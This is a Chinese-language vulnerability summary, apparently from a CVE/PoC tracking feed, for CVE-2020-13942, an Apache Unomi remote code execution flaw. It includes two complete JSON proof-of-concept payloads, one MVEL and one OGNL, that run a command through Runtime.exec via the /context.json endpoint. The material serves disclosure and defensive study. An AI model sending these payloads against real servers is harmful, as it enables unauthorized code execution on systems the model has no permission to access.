## CVE-2020-13942 - Apache Unomi RCE

**漏洞编号:** CVE-2020-13942

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Unomi

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** < 1.5.2

**利用条件:** 需要可以访问/context.json端点

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2020-13942 存在于 Apache Unomi 1.5.2 之前的版本中。攻击者可以通过向 `/context.json` 端点注入恶意的 OGNL 或 MVEL 脚本来利用此漏洞，实现远程代码执行。

**漏洞利用方式：**

1.  **确定目标版本：** 确认目标 Apache Unomi 服务器的版本低于 1.5.2。
2.  **发送恶意请求：**  向 `/context.json` 端点发送包含恶意 OGNL 或 MVEL 表达式的 POST 请求。

    *   **MVEL POC：**
        ```json
        {
            "filters": [
                {
                    "id": "boom",
                    "filters": [
                        {
                            "condition": {
                                 "parameterValues": {
                                    "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"gnome-calculator\");"
                                },
                                "type": "profilePropertyCondition"
                            }
                        }
                    ]
                }
            ],
            "sessionId": "boom"
        }
        ```

    *   **OGNL POC：**
        ```json
        {
          "personalizations":[
            {
              "id":"gender-test",
              "strategy":"matching-first",
              "strategyOptions":{
                "fallback":"var2"
              },
              "contents":[
                {
                  "filters":[
                    {
                      "condition":{
                        "parameterValues":{
                          "propertyName":"(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\" gnome-calculator\"))",
                          "comparisonOperator":"equals",
                          "propertyValue":"male"
                        },
                        "type":"profilePropertyCondition"
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "sessionId":"boom"
        }
        ```
3.  **执行代码：**  如果漏洞存在且利用成功，服务器将执行恶意代码，例如打开计算器 (`gnome-calculator`)。

**有效性：**

提供的 POC 代码是有效的。搜索引擎结果和漏洞库信息均表明，此漏洞允许通过注入恶意 OGNL 或 MVEL 表达式来执行任意代码。该 POC 提供了两种利用方式：MVEL 和 OGNL。

**投毒风险：**

提供的代码片段中没有明显的恶意或隐藏功能。POC 主要目的是展示如何利用漏洞执行命令（例如启动计算器）。 因此，投毒风险评估为0%。


**项目地址:** [eugenebmx/CVE-2020-13942](https://github.com/eugenebmx/CVE-2020-13942)

**漏洞详情:** [CVE-2020-13942](https://nvd.nist.gov/vuln/detail/CVE-2020-13942)